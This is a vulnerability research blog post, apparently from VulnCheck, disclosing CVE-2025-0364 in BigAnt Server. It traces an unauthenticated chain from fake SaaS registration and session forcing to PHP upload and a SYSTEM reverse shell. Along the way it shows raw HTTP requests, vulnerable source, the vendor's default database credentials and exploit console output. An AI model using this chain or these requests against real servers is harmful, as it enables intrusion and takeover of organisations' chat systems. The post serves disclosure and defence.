---
title: "BigAnt CVE-2025-0364 Exploitation - Blog - VulnCheck"
date: 2025-02-27T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# BigAnt CVE-2025-0364 Exploitation - Blog - VulnCheck

<br/>

<br/>
\\nThe BigAntSoft BigAnt Server, which provides a Windows hosted on-premises chat server that focuses on business use cases, is vulnerable to unauthenticated remote code execution via account registration and PHP file uploads. The vulnerability takes advantage of a default exposed SaaS registration that allows an attacker to solve a simple CAPTCHA and then create an administrative user that can upload to the Cloud Storage Add-in. The system allows for the upload of PHP files that can trigger without authentication, leading to a exploit chain of no-authentication to remote code execution in all current, 5.6.06, and below versions.\\n\\nThe VulnCheck team identified this vulnerability during the triage of \[CVE-2024-54761\](https://github.com/nscan9/CVE-2024-54761-BigAnt-Office-Messenger-5.6.06-RCE-via-SQL-Injection), which turned out to require administrator access and had an incorrect CVSS Privileges Required (PR) value. The VulnCheck team identified a few quick indicators of insecure programming practices and chose to investigate deeper, leading to the discovery of this authentication bypass and file upload remote code execution. At the time of discovery there were roughly 50 BigAnt servers on the internet and at the time of publishing this blog there were around 30 identifiable instances.\\n\\n## Shells & Exploit Preamble\\n\\nIn summary, an attacker can gain full remote code execution unauthenticated via a chain of 10 requests. The VulnCheck \[Initial Access Intelligence\](https://vulncheck.com/product/initial-access-intelligence) has published the public exploit: https://github.com/vulncheck-oss/cve-2025-0364\\n\\nThe following shows the exploit in action:\\n\\n\`\`\`sh\\npoptart@grimm:~/src/initial-access/feed/cve-2025-0364 $ ./build/cve-2025-0364\_linux-amd64 -rhost 10.0.0.104 -rport 8000 -lhost 10.0.1.10 -lport 1337 -v -c -e -captcha-hash 652def5853ff0030a259b30af8e7facb\_6e58b283a2a66e4db833ac2547019a30 -captcha-session 4fbsn0i6bdiuu6vuik99gbhndb -captcha VKZ6\\ntime=2025-01-09T14:50:18.502-07:00 level=STATUS msg="Certificate not provided. Generating a TLS Certificate"\\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg="Starting TLS listener on 10.0.1.10:1337"\\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg="Starting target" index=0 host=10.0.0.104 port=8000 ssl=false "ssl auto"=false\\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg="Validating Bigantsoft Bigant Server target" host=10.0.0.104 port=8000\\ntime=2025-01-09T14:50:18.620-07:00 level=SUCCESS msg="Target verification succeeded!" host=10.0.0.104 port=8000 verified=true\\ntime=2025-01-09T14:50:18.620-07:00 level=STATUS msg="Running a version check on the remote target" host=10.0.0.104 port=8000\\ntime=2025-01-09T14:50:18.650-07:00 level=VERSION msg="The reported version is 5.6.06" host=10.0.0.104 port=8000 version=5.6.06\\ntime=2025-01-09T14:50:18.650-07:00 level=SUCCESS msg="The target appears to be a vulnerable version!" host=10.0.0.104 port=8000 vulnerable=yes\\ntime=2025-01-09T14:50:18.650-07:00 level=STATUS msg="Password that will be used for authentication: kyLZiAddnH"\\ntime=2025-01-09T14:50:18.650-07:00 level=STATUS msg="Registering SaaS org: LBJCUE (mpzo@fldlmarv.com) with password: kyLZiAddnH"\\ntime=2025-01-09T14:50:18.675-07:00 level=STATUS msg="Getting new PHP session and pinning the SaaS org to the session"\\ntime=2025-01-09T14:50:18.747-07:00 level=STATUS msg="Retrieving org SSID from demo page with session v1cir7mh9v4dfv4ik54mhq6so0"\\ntime=2025-01-09T14:50:18.764-07:00 level=STATUS msg="Retrieved SSID for LBJCUE: 387360F0-EECD-622B-5B90-C37F2BBD45B3"\\ntime=2025-01-09T14:50:18.765-07:00 level=STATUS msg="Activating SaaS organization"\\ntime=2025-01-09T14:50:22.627-07:00 level=STATUS msg="Authenticating to the addin SaaS admin"\\ntime=2025-01-09T14:50:22.673-07:00 level=STATUS msg="Visiting SaaS addin cloud drive page"\\ntime=2025-01-09T14:50:22.762-07:00 level=STATUS msg="Got cloud drive root path UUID: 99C8911A-DCB3-E5F2-4298-1E3567AA0DAD"\\ntime=2025-01-09T14:50:22.762-07:00 level=STATUS msg="Attempting to upload \`JQsaYCKEOu.php\` to cloud drive addin"\\ntime=2025-01-09T14:50:22.819-07:00 level=STATUS msg="Attempting to trigger final payload, timeout is expected after callback"\\ntime=2025-01-09T14:50:22.819-07:00 level=STATUS msg="Requesting final payload at: http://10.0.0.104:8000/data/387360F0-EECD-622B-5B90-C37F2BBD45B3/pan/99C8911A-DCB3-E5F2-4298-1E3567AA0DAD/2025-01-09/JQsaYCKEOu.php"\\ntime=2025-01-09T14:50:22.821-07:00 level=SUCCESS msg="Caught new shell from 10.0.0.104:51690"\\ntime=2025-01-09T14:50:22.821-07:00 level=STATUS msg="Active shell from 10.0.0.104:51690"\\nMicrosoft Windows \[Version 10.0.17763.107\]\\n(c) 2018 Microsoft Corporation. All rights reserved.\\n\\nC:\\Program Files (x86)\\BigAntSoft\\IM Console\\im\_webserver\\htdocs\\data\\387360F0-EECD-622B-5B90-C37F2BBD45B3\\pan\\99C8911A-DCB3-E5F2-4298-1E3567AA0DAD\\2025-01-09>whoami\\nwhoami\\nnt authority\\system\\n\\n\`\`\`\\n\\nWhile the shells are always great, the full path of discovery to exploitation can be just as valuable than the exploit.\\n\\n## Authentication Paths & SaaS Organizations\\n\\nAfter having the initial disappointing run in with a bad CVSS score assignment(PR is wrong so often), we decided to see if it was possible to quickly identify an authentication bypass vulnerability to amend the sins of the first CVSS score. The investigation combined static analysis with some simple fuzzing of paths to identify all unauthenticated endpoints before even diving too deep into application logic. The server utilizes the ThinkPHP framework, which is popular among Chinese vendors, and uses a model-view-controller design.\\n\\nInvestigation started with a quick enumeration of default exposed web pages later there were multiple views to landing pages that all appeared to be outside the standard \`/index.php/Home/login/index.html\` route. The most standout of the endpoints were multiple instances of account registration pages, which are a common vector for getting partial authentication or unexpected session settings, making it a prime target for an attacker. The one that showed the most "red flags" was the \`/index.php/Home/Saas/reg\_email.html/index.php/Home/Saas/reg\_email.html\` URI, which presented the following page:\\n\\n!\[BigAnt SaaS registration landing page\](/blog/bigant-cve-2025-0364/bigant-1-saas-registration.png){:width="100%"}\\n\\nThese are the exact red flags we look for; auto-filled QQ addresses and user information, no documentation, a custom CAPTCHA, and a mention of organizational registration. Non-user initiated role creation is often a good place to look for authentication bypasses as machine, API, or group accounts often don't follow expected single user logic. Filling out the information and solving the CAPTCHA, we land on the following success message:\\n\\n!\[BigAnt successful SaaS registration message\](/blog/bigant-cve-2025-0364/bigant-2-saas-registration.png){:width="100%"}\\n\\nThe server then sends an email, if configured with proper SMTP settings, with the SaaS registration information and an activation link containing a UUID. As an attacker, it's not good to burn any emails in our control and leaving breadcrumbs and we do not want to rely on the SMTP server having a complete configuration, so it was time to see if we could get the registration activation variables without configured SMTP or an email. It was time to dig in and see what's happening in these requests to see if there's anything we can use.\\n\\nThinkPHP allows you to embed functions inside of HTML forms and other backend content that corresponds to the HTML file field information. This means that functions inside the HTML files can be called to the corresponding controller functions. We can verify this by checking that the HTML file calls the \`reg\_email\_post\` function with the data provided in the \`Application/Home/View/Saas/reg\_email.html\` page:\\n\\n\`\`\`html\\n\\n\\n\\n\\n\\n

\\n

\\n

{:L('\_SAAS\_REGISTER\_')}

\\n

\\n

\\n

\\n \\n

\\n

\\n \\n

\\n

\\n \\n

\\n

\\n \\n

\\n\\n\`\`\`\\n\\nThe \`reg\_email\_post\` function call is called inside of \`Application/Home/Controller/SaasController.class.php:63\`, which handles the sending of the email with the filled in data from the backend and user provided information. We want to follow the logic of where the UUID gets set and that appears in the following as the \`saas\_id\`:\\n\\n\`\`\`php\\n/\*\*\\n \* 邮箱saas\\n \* 1 新增SAAS\\n \* 2 发送邮件\\n \* 3 通过邮件地址激活SAAS\\n \*/\\nfunction reg\_email\_post(){\\n\\n /\*\\n if(!$this->check\_verify(I('verify'))){\\n $this->error(L('\_VALID\_VERIFY\_ERROR\_'));exit;\\n };\\n \*/\\n \\n $res = $this->reg\_saas(0);\\n \\n if($res\['status'\]){\\n $url = sp\_get\_host() . U('reg\_activation',array('saas\_id'=>$saasId)) ; //生成激活的URL地址\\n //发送邮件\\n $subject = L('\_ACTIVATION\_MAIL\_SUBJECT\_') ;\\n $content = L('\_ACTIVATION\_MAIL\_CONTENT\_') ;\\n $content = str\_replace('\[url\]',$url,$content);\\n $content = str\_replace('\[minute\]',$M->activation\_expire\_miniute,$content);\\n $res =sp\_send\_mail($data\['org\_email'\], $subject, $content) ;\\n if ($res){\\n $url = U('reg\_email\_ok',array('saas\_id'=>$saasId));\\n $this->success(L('\_ADD\_SUCCESS\_'), $url);\\n }else{\\n $this->error($res\['err\_msg'\]);\\n }\\n }else{\\n $this->error($M->getError());\\n }\\n}\\n\`\`\`\\n\\nBased on some light ThinkPHP knowledge, we know that the application utilizes a \`create()\` and \`add()\` inheritance to handle creation of database objects. After the email is sent the user is redirected to a \`reg\_saas\` route and calls the function in \`Application/Home/Controller/SaasController.class.php\` with the registration \`POST\` request to \`/index.php/Home/Saas/reg\_saas\`. The following snippet completes the account registration step and creates the \`saas\_id\` and updates the database:\\n\\n\`\`\`php\\n/\*\*\\n \* 注册SAAS\\n \* @param number $status\\n \* @param number $is\_send\_activation\_email 是否发送激活邮件(官方注册，外面发送)\\n \* @return number|unknown\\n \*/\\nfunction reg\_saas($status = 0,$is\_send\_activation\_email = 1){\\n \\n $M = D('Common/Saas');\\n\\n $M->is\_send\_activation\_email = $is\_send\_activation\_email ;\\n \\n //清除过期无效的数据\\n $M->clearExpire();\\n \\n\\n $data = $M->create();\\n\\n if (!$data){\\n return sp\_api\_fail(0, $M->getError()) ;\\n }\\n \\n $data\['saas\_status'\] = $status ;\\n $res = $M->add($data);\\n\\n //更新接口服务\\n if ($res && $status){\\n $param = $M->where(array('saas\_name'=>$data\['saas\_name'\]))->field('saas\_id')->find();\\n \\Common\\Lib\\AntCmd::execUpdatePack(CMD\_SAAS\_UPDATE, $param\['saas\_id'\]) ;\\n }\\n \\n if ($res){\\n return sp\_api\_success($data);\\n }else{\\n return sp\_api\_fail(0, $M->getError()) ;\\n }\\n \\n \\n}\\n\`\`\`\\n\\nThere's a lot more ThinkPHP logic that handles the MVC components that wasn't worth stepping through, so when in doubt \`ripgrep\`. A quick search and a validation that the default install provides a MySQL server landed me at the \`Application/Install/Data/dbcreate/ms\_mysql.sql\` install SQL file:\\n\\n\`\`\`sql\\n-- ----------------------------\\n-- Table structure for sys\_saas\\n-- ----------------------------\\nDROP TABLE IF EXISTS \`sys\_saas\`;\\nCREATE TABLE \`sys\_saas\` (\\n \`SAAS\_ID\` varchar(50) NOT NULL DEFAULT '',\\n \`SAAS\_NAME\` varchar(100) DEFAULT '',\\n \`SAAS\_SHOWNAME\` varchar(100) DEFAULT '',\\n \`SAAS\_DBNAME\` varchar(50) DEFAULT '',\\n \`SAAS\_DESC\` varchar(255) DEFAULT '',\\n \`SAAS\_CREATE\_DATE\` bigint(20) DEFAULT '0',\\n \`SAAS\_STATUS\` int(2) DEFAULT '0',\\n \`ORG\_CONTACT\` varchar(50) DEFAULT '',\\n \`ORG\_PHONE\` varchar(50) DEFAULT '',\\n \`ORG\_ADDRESS\` varchar(255) DEFAULT '',\\n \`ORG\_EMAIL\` varchar(50) DEFAULT '',\\n \`ORG\_FAX\` varchar(50) DEFAULT '',\\n \`ORG\_POSTCODE\` varchar(50) DEFAULT '',\\n \`AUTH\_NUMBERS\` varchar(100) DEFAULT '0',\\n \`AUTH\_CODE\` varchar(2000) DEFAULT '',\\n \`AUTH\_EXPIREDATE\` varchar(255) DEFAULT '0',\\n \`SAAS\_PWD\` varchar(50) DEFAULT '',\\n \`SAAS\_INSTALLDATE\` varchar(255) DEFAULT '',\\n PRIMARY KEY (\`SAAS\_ID\`)\\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\\n\`\`\`\\n\\nGreat, now we have the corresponding table that handles SaaS registration and we just need to verify that our data is in the database. Another quick little grep for the MySQL connection string shows the following:\\n\\n\`\`\`php\\nDemo/Controller/TestController.class.php\\n29: $dbconfig\['DB\_TYPE'\]='mysql' ;\\n55: $conns\[\] = array('mysql','127.0.0.1','3306','root','www.upsoft01.com','antdbms\_aipu');\\n85: //$conns\[\] = array('mysql','127.0.0.1','3306','root','www.upsoft01.com','antdbms\_aipu');\\n214: //var\_dump(function\_exists('mysql\_connect'));\\n\`\`\`\\n\\nSure enough, a quick MySQL connection on the server later with \`root:www.upsoft01.com\` and we can see the following entries for the table:\\n\\n!\[BigAnt registration sys\_saas database entries\](/blog/bigant-cve-2025-0364/bigant-3-saas-registration-db.png){:width="100%"}\\n\\nThis validates that the entries are actually be created with the data we provided, and shows that we need to figure out a way to get access to the \`SAAS\_ID\` value. It's also important to note the multiple UUIDs and SaaS organizations, as it will come up later when we mature the exploit.\\n\\n## Debug Activation UUID Leak\\n\\nA quick glance through the application logic shows that we need to look for instances where \`$\_SESSION\['saas'\]\` or \`sp\_saas\_id()\` is called and accessible by a user or unauthenticated in order for us to recover the UUID. The \`sp\_saas\_id\` function can be found in \`Application/Common/Common/site.php:143\` and corroborates this:\\n\\n\`\`\`php\\nfunction sp\_saas\_id(){\\n if (! $\_SESSION\['saas'\])\\n return '';\\n\\n return $\_SESSION\['saas'\]\['saas\_id'\];\\n}\\n\`\`\`\\n\\nSome static analysis (ripgrep my dearest) allowed us to identify roughly ~200 instances of \`sp\_saas\_id\` calls, and some more quick session checks narrow down any that don't require authentication. One entry stood out far more than the others in \`Application/Demo/View/Api/index.html\`:\\n\\n\`\`\`html\\n\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n

{$module\['name'\]}/{$method\['name'\]}【{$method\['intro'\]}】
=============================================================

\\n

\\n [{:L('\_CLEAN\_SELECT\_OPTIONS\_')}](#)\\n

\\n \\n

\\n ssid\\n \\n SAAS ID\\n

\\n

\\n _\*_ uid\\n\`\`\`\\n\\nOpening up this page in a empty session shows the following demo page, which contains almost all API calls but most importantly fills the forms with the called \`sp\_saas\_id\` function call:\\n\\n!\[BigAnt demo page leaking sp\_saas\_id\](/blog/bigant-cve-2025-0364/bigant-4-demo-page.png){:width="100%"}\\n\\nWhat's up with the \`ssid\` UUID value of \`122C8BFA-BD74-9668-BE31-EA159FB2C437\` and why is that the UUID tied to a \`antdbms\_pwn\` object from the previous database \`sys\_saas\` query? Where did it come from? \\n\\nIt turns out that SaaS ID from the application gets assigned to the first created \`saas\` organization and if your role or session does not have a currently assigned one, the first created one is set as the default. This presents a problem, we cannot retrieve the information that we submitted when registering when submitting the organization registration because that object will get assigned and we don't know the email, org name, and password for that organization. Theoretically, if the attacker creates the first organization this would be a usable path, but we want something better. Let's see if we can find a way to force a session to belong to a \`saas\` org with our controlled information and grantee success.\\n\\n## Forcing SaaS Session\\n\\nThis time, we weren't quite as lucky to find a session assigned variable in a debug page, nor a quick function call. Looking for all interactions with identified SaaS variable names gave us quite a few places to look. Ironically, some manual review showed that the primary login page index function contained some suspicious looking code at \`Application/Home/Controller/LoginController.class.php:90\`:\\n\\n\`\`\`php\\n/\*\*\\n \* 登录\\n \*/\\npublic function index(){\\n\\n $to = I('to','admin','htmlspecialchars') ;\\n $app = I('app');\\n $saas = I('saas');\\n\\n if (! $saas) {\\n $saas = cookie('saas');\\n }\\n \\n\\n \\n //20170418 针对只有一个SAAS的企业，默认给出企业ID\\n //李成提的需求\\n $M = D('Common/Saas');\\n $data = null ;\\n if ($saas){\\n //20170518 如果是登妨系统管理台，那个数据库密码如果是 默认密码，那么显示出来\\n $data = $M->where(array('saas\_name'=>$saas))->fetchSql(false)->select();\\n }\\n\\n //\\n if (! $data){\\n $data = $M->fetchSql(false)->select();\\n } \\n\\n \\n $saas = $data\[0\]\['saas\_name'\] ;\\n\\n \\n\\n //20170419 加入默认的帐号\\n $account = htmlspecialchars($\_COOKIE\['account'\]) ;\\n if (! $account){\\n $account = 'superadmin';\\n }\\n \\n \\n $this->assign('saas',$saas) ;\\n $this->assign('account',$account) ;\\n $this->assign('metaTitle',C('PRODUCT\_NAME') . ' ' . L('\_LOGIN\_TITLE\_')) ;\\n $this->assign('to',$to) ;\\n $this->assign('app',$app) ;\\n \\n if(I('flag')){\\n $this->assign('flag',I('flag')) ;\\n }\\n\`\`\`\\n\\nIn summary, the main login page index function will look for an assigned \`saas\` session, if none is found it will look for a cookie named \`saas\` and assign (via \`$this->assign()\`) any matching SaaS organization set in that cookie to the session. \\n\\nIn order to test this we can request the login page with a \`saas=aaa\` cookie set in a new session:\\n\\n\`\`\`html\\nGET /index.php/Home/Login/index.html HTTP/1.1\\nHost: 10.0.0.104:8000\\nAccept-Language: en-US,en;q=0.9\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7\\nAccept-Encoding: gzip, deflate, br\\nConnection: keep-alive\\nCookie: saas=aaa\\n\\n\\n\`\`\`\\n\\nThen, take the session cookie from the above request and revisit the demo page to trigger the \`ssid\` output:\\n\\n!\[BigAnt demo page with attacker controlled SaaS\](/blog/bigant-cve-2025-0364/bigant-5-demo-page-fixed-saas.png){:width="100%"}\\n\\nBingo. We have tied the \`saas\` that we registered to our controlled value for the session and was able to successfully retrieve the \`ssid\` value.\\n\\nAll that's left is to verify the original hypothesis and attempt to complete the registration of the SaaS organization. The core function for registration activation lives in \`Application/Home/Controller/SaasController.class.php:411\`:\\n\\n\`\`\`php\\n/\*\*\\n \* 激活SAAS\\n \* 1、获得SAAS\\n \* 2、判断是否超时\\n \* 3、判断是否激活\\n \* 4、激活SAAS\\n \*/\\nfunction reg\_activation(){\\n $saasId = I('saas\_id');\\n \\n $M = D('Common/Saas');\\n $info = $M->find($saasId) ;\\n \\n //判断是否有数据\\n if (!$info){\\n $this->error(L('\_ACTIVATION\_ERROR\_NODATA\_')) ;\\n }\\n \\n //判断是否已经激活了\\n if ($info\['saas\_status'\]){\\n $this->error(L('\_ACTIVATION\_ERROR\_ALREALY\_')) ;\\n }\\n \\n //判断是否过期\\n if ($M->isExpire($info\['saas\_create\_date'\])){\\n $this->error(L('\_ACTIVATION\_ERROR\_EXPIRE\_')) ;\\n }\\n \\n //激活数据\\n $saasName = $info\['saas\_name'\] ;\\n $res = $M->activationSaas($saasName) ;\\n \\n if ($res){\\n $url = U('reg\_complete',array('saas'=>$saasName));\\n $this->success(L('\_ACTIVATION\_SUCCESS\_'), $url);\\n }else{\\n $this->error(L('\_ACTIVATION\_ERROR\_'));\\n }\\n}\\n\`\`\`\\n\\nIf the activation data is correct and the \`saas\_id\` is the same as the \`ssid\` then this function calls \`activationSaas\` in \`Application/Common/Model/SaasModel.class.php:146\`:\\n\\n\`\`\`php\\n/\*\*\\n \* 激活SAAS\\n \* @param unknown $saasName 企业ID (在LINUX上安装的时候会出现SAASID变成1,不知道什么原因，所以这里用企业ID来判断)\\n \* @param unknown $password 明文密码 用于发邮件\\n \*/\\npublic function activationSaas($saasName){\\n\\n $where\['saas\_name'\] = $saasName;\\n $info = $this->where($where)->find();\\n \\n $saasId = $info\['saas\_id'\];\\n $saasName = $info\['saas\_name'\];\\n $dbName = $info\['saas\_dbname'\];\\n $adminPassword = $info\['saas\_pwd'\];\\n $installDate = $info\['saas\_installdate'\] ;\\n \\n if (! $info){\\n return false ;\\n }\\n \\n //创建数据库\\n $res = $this->createDB($info);\\n \\n //设置SAAS的服务关系\\n if ($res){\\n $M = D('Ms/server');\\n $server = $M->where(array('server\_type',2))->find();\\n \\n if ($server){\\n $serverId = $server\['server\_id'\];\\n $sql = " insert into sys\_saas\_server(gid,saas\_id,login\_server\_id,server\_is\_mast) values('" . sp\_get\_guid(). "','$saasId','$serverId',1)" ;\\n $M->db->execute($sql);\\n }\\n }\\n \\n //更新状态\\n $data\['saas\_status'\] = 1 ;\\n $data\['saas\_id'\] = $saasId ;\\n if (! $installDate){\\n $data\['saas\_installdate'\] = \\Common\\Lib\\AntCmd::getTryCode();\\n $data\['auth\_numbers'\] = \\Common\\Lib\\AntCmd::encrypt(50);\\n $data\['auth\_expiredate'\] = \\Common\\Lib\\AntCmd::encrypt(strtotime(date('Y-m-d H:i:s',strtotime('+15 day'))));\\n }\\n $this->save($data);\\n \\n //发送邮件通知\\n if ($this->is\_send\_activation\_email){\\n $this->sendMailNotify($info);\\n }\\n \\n \\n return true ;\\n \\n}\\n\`\`\`\\n\\nThis successfully activates the SaaS organization and sets up the organization with the data we initially registered with. Time to test the activation of our initial organization:\\n\\n\`\`\`html\\nPOST /index.php/Home/Saas/reg\_activation HTTP/1.1\\nHost: 10.0.0.104:8000\\nContent-Length: 44\\nContent-Type: application/x-www-form-urlencoded\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36\\nCookie: PHPSESSID=5q37l00e0alpb5euu40403tj3e;\\nConnection: keep-alive\\n\\nsaas\_id=1438134D-4ECD-9FBC-CE77-8EF6C37F47DE\\n\`\`\`\\n\\nThe server then responds with a "Activate successfully" and a little smiley face:\\n\\n\`\`\`html\\nHTTP/1.1 200 OK\\nDate: Thu, 09 Jan 2025 19:52:29 GMT\\nServer: Apache/2.4.46 (Win32) OpenSSL/1.1.1g PHP/7.4.14\\nX-Powered-By: ThinkPHP\\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\\nCache-Control: private\\nPragma: no-cache\\nContent-Length: 1655\\nKeep-Alive: timeout=5, max=100\\nConnection: Keep-Alive\\nContent-Type: text/html; charset=utf-8\\n\\n\\n\\n\\n\\n跳转提示\\n\\n\*{ padding: 0; margin: 0; }\\nbody{ background: #fff; font-family: '微软雅黑'; color: #333; font-size: 16px; }\\n.system-message{ padding: 24px 48px; }\\n.system-message h1{ font-size: 100px; font-weight: normal; line-height: 120px; margin-bottom: 12px; }\\n.system-message .jump{ padding-top: 10px}\\n.system-message .jump a{ color: #333;}\\n.system-message .success,.system-message .error{ line-height: 1.8em; font-size: 36px }\\n.system-message .detail{ font-size: 12px; line-height: 20px; margin-top: 12px; display:none}\\n\\n\\n\\n

\\n

:)
==

\\n

Activate successfully

\\n

\\n

\\n\\n\`\`\`\\n\\nWe now have an activated SaaS org and the information on how to authenticate to the system. In order to actually do this and to see what we can do post-authentication, we need to first find where to use these credentials.\\n\\n## "Cloud Drive" Authentication & Just Upload PHP I Guess\\n\\nUsing the data from the first initial crawl for unauthenticated pages we quickly identified that \`/index.php/Addin/login/index.html\` would provide an authentication page requesting the company code, username, and password:\\n\\n!\[BigAnt Addin login page with data that was utilized to register the SaaS organization\](/blog/bigant-cve-2025-0364/bigant-6-saas-login.png){:width="100%"}\\n\\nThe only information that we didn't submit in the initial registration was the username. A quick cross-reference in the database with the newly created SaaS organization in \`antdbms\_aaa\` shows that the username that gets created with \`admin\` (shocking). A quick submission with \`aaa\` as the company code and \`admin:123456\` and we land on \`/index.php/addin/public/load/clientid/1.html\`, which provides the following page:\\n\\n!\[BigAnt post-authentication landing page for the add-in section. A Cloud Disk button and Bulletin button is visible\](/blog/bigant-cve-2025-0364/bigant-8-saas-login-landing.png){:width="100%"}\\n\\nWe have officially confirmed and validated authentication. Instead of going straight for the SQL injection in the original CVE, Plus, the "Cloud Disk" is intriguing and didn't match much of the code I'd seen used in the rest of the application. Let's see what happens when we go to the Cloud Disk:\\n\\n!\[BigAnt Cloud Disk page displaying cloud disk filesystem icons\](/blog/bigant-cve-2025-0364/bigant-9-saas-login-cloud-drive.png){:width="100%"}\\n\\nClicking on the Personal Cloud Disk link in the Drive page immediately leads us to the following page:\\n\\n!\[BigAnt Cloud Disk file upload page\](/blog/bigant-cve-2025-0364/bigant-10-saas-cloud-drive-upload-page.png){:width="100%"}\\n\\nOh goodie a upload page. We are building a tower, but entirely made out of red flags.\\n\\nIf you immediately started thinking of MIME type sniffing bypasses or extension tricks on Windows related to recent disclosures, I applaud you but you might be overthinking. Let's just try and upload some PHP:\\n\\n\`\`\`php\\n\\n\`\`\`\\n\\nThe application happily accepts our very hard fought PHP file and happily presents the uploaded PHP file:\\n\\n!\[BigAnt Cloud Disk successfully uploading PHP file\](/blog/bigant-cve-2025-0364/bigant-12-saas-cloud-drive-upload-php.png){:width="100%"}\\n\\nThe preview options and other interaction pages will not work, but the HTML references the page just fine at \`/data/CB1E3E2E-58C5-0CB6-BD29-397DF76AB254/pan/C65DC0F8-E4E8-8FB2-E345-6C53ABCE8D03/2025-02-21/pwn.php\` so we open up the file and reach the finishing line:\\n\\n!\[BigAnt PHP file execution\](/blog/bigant-cve-2025-0364/bigant-13-saas-cloud-drive-php-exec.png)\\n\\nSometimes the silliest things work the best. We officially have a full exploit chain to go from no authentication to arbitrary PHP execution. Let's automate and mature it into an exploit.\\n\\n## Automation with go-exploit\\n\\nIn summary, the vulnerability requires the following HTTP requests to achieve full code execution:\\n\\n1. Get the CAPTCHA and CSRF tokens.\\n2. Solve CAPTCHA manually.\\n3. Register a new SaaS organization with the CAPTCHA and CSRF tokens from steps 1 & 2 with registration settings.\\n4. In a new session, request the login page with a \`saas=\` cookie set to the new organization in step 3, this causes the new session to be bound to the SaaS instance the attacker just registered.\\n5. Use the session cookie from step 4 to request the demo page that displays SaaS UUID, requiring the bound SaaS session or else the application will bind the session to the default SaaS organization which is not known to the attacker.\\n6. Activate the registered organization with the SaaS UUID acquired in step 5.\\n7. Authenticate to the "Cloud Drive" page with the \`admin\` account of the organization and the attacker controlled registration data.\\n8. Get the Cloud Drive root IDs, UUIDs, date in \`YYYY-MM-DD\` format, and path information in order to know where the file is accessible.\\n9. Upload a PHP payload, note the paths and upload dates.\\n10. Trigger the PHP shell with the paths without authentication.\\n\\nThis is the perfect opportunity to use \[go-exploit\](https://github.com/vulncheck-oss/go-exploit) to create a small self contained exploit. All said and done the exploit was only roughly ~350 lines of code. The framework is the exact same system that the VulnCheck Initial Access Intelligence team uses to quickly create self-contained and mature exploits, and we are giving out our copy of CVE-2025-0364 to show off how well it works for situations like this: https://github.com/vulncheck-oss/cve-2025-0364\\n\\nFor the moment of truth, retrieve the CAPTCHA and pre-conditions for the exploit:\\n\\n\`\`\`bash\\npoptart@grimm:~/src/initial-access/feed/cve-2025-0364 $ ./build/cve-2025-0364\_linux-amd64 -rhost 10.0.0.104 -rport 8000 -v -c -e\\ntime=2025-01-09T14:49:56.227-07:00 level=STATUS msg="Starting target" index=0 host=10.0.0.104 port=8000 ssl=false "ssl auto"=false\\ntime=2025-01-09T14:49:56.227-07:00 level=STATUS msg="Validating Bigantsoft Bigant Server target" host=10.0.0.104 port=8000\\ntime=2025-01-09T14:49:56.272-07:00 level=SUCCESS msg="Target verification succeeded!" host=10.0.0.104 port=8000 verified=true\\ntime=2025-01-09T14:49:56.272-07:00 level=STATUS msg="Running a version check on the remote target" host=10.0.0.104 port=8000\\ntime=2025-01-09T14:49:56.301-07:00 level=VERSION msg="The reported version is 5.6.06" host=10.0.0.104 port=8000 version=5.6.06\\ntime=2025-01-09T14:49:56.301-07:00 level=SUCCESS msg="The target appears to be a vulnerable version!" host=10.0.0.104 port=8000 vulnerable=yes\\ntime=2025-01-09T14:49:56.301-07:00 level=STATUS msg="CAPTCHA flags not set, retrieving captcha-hash"\\ntime=2025-01-09T14:49:56.317-07:00 level=STATUS msg="Open the following page in a browser and solve the CAPTCHA: http://10.0.0.104:8000/index.php/Home/Public/verify"\\ntime=2025-01-09T14:49:56.317-07:00 level=STATUS msg="Solve CAPTCHA and pass the following flags to this exploit: \`-captcha-hash 652def5853ff0030a259b30af8e7facb\_6e58b283a2a66e4db833ac2547019a30 -captcha-session 4fbsn0i6bdiuu6vuik99gbhndb -captcha \`"\\n\`\`\`\\n\\nSolve the CAPTCHA and fire away to get a good ol' \`NT AUTHORITY\\SYSTEM\` reverse shell:\\n\\n\`\`\`sh\\npoptart@grimm:~/src/initial-access/feed/cve-2025-0364 $ ./build/cve-2025-0364\_linux-amd64 -rhost 10.0.0.104 -rport 8000 -lhost 10.0.1.10 -lport 1337 -v -c -e -captcha-hash 652def5853ff0030a259b30af8e7facb\_6e58b283a2a66e4db833ac2547019a30 -captcha-session 4fbsn0i6bdiuu6vuik99gbhndb -captcha VKZ6\\ntime=2025-01-09T14:50:18.502-07:00 level=STATUS msg="Certificate not provided. Generating a TLS Certificate"\\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg="Starting TLS listener on 10.0.1.10:1337"\\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg="Starting target" index=0 host=10.0.0.104 port=8000 ssl=false "ssl auto"=false\\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg="Validating Bigantsoft Bigant Server target" host=10.0.0.104 port=8000\\ntime=2025-01-09T14:50:18.620-07:00 level=SUCCESS msg="Target verification succeeded!" host=10.0.0.104 port=8000 verified=true\\ntime=2025-01-09T14:50:18.620-07:00 level=STATUS msg="Running a version check on the remote target" host=10.0.0.104 port=8000\\ntime=2025-01-09T14:50:18.650-07:00 level=VERSION msg="The reported version is 5.6.06" host=10.0.0.104 port=8000 version=5.6.06\\ntime=2025-01-09T14:50:18.650-07:00 level=SUCCESS msg="The target appears to be a vulnerable version!" host=10.0.0.104 port=8000 vulnerable=yes\\ntime=2025-01-09T14:50:18.650-07:00 level=STATUS msg="Password that will be used for authentication: kyLZiAddnH"\\ntime=2025-01-09T14:50:18.650-07:00 level=STATUS msg="Registering SaaS org: LBJCUE (mpzo@fldlmarv.com) with password: kyLZiAddnH"\\ntime=2025-01-09T14:50:18.675-07:00 level=STATUS 